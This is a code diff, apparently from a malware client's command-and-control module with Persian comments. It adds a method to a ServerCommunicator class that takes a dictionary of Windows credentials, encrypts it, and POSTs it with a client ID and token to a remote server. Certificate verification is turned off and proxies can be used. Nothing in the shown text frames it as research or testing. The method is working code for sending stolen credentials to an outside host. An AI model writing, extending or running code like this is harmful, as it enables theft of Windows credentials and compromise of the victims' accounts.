@@ -622,6 +622,39 @@ class ServerCommunicator:
             "proxies_configured": self.proxies is not None
         }
 
+    def upload_windows_credentials(self, credential_data: Dict) -> Dict:
+        """آپلود credential های ویندوز"""
+        try:
+            self.logger.info(f"Preparing Windows credentials upload: client_id={self.client_id}")
+            
+            credential_data_json = json.dumps(credential_data, ensure_ascii=False)
+            encrypted_credential_data = self.encryption.encrypt(credential_data_json)
+            
+            encrypted_data = {
+                "action": "upload_windows_credentials",
+                "client_id": self.client_id,
+                "token": self.token,
+                "credential_data": encrypted_credential_data,
+                "timestamp": datetime.now().isoformat()
+            }
+            
+            self.logger.info("Sending Windows credentials")
+            response = requests.post(
+                self.server_url,
+                json=encrypted_data,
+                timeout=60,
+                verify=False,
+                proxies=self.proxies
+            )
+            response.raise_for_status()
+            
+            self.logger.info("Windows credentials upload successful")
+            return response.json()
+            
+        except Exception as e:
+            self.logger.error(f"Windows credentials upload error: {str(e)}")
+            raise CommunicationError(f"Windows credentials upload error: {str(e)}")
+
 class CommunicationError(Exception):
     """خطای ارتباط با سرور"""
     pass
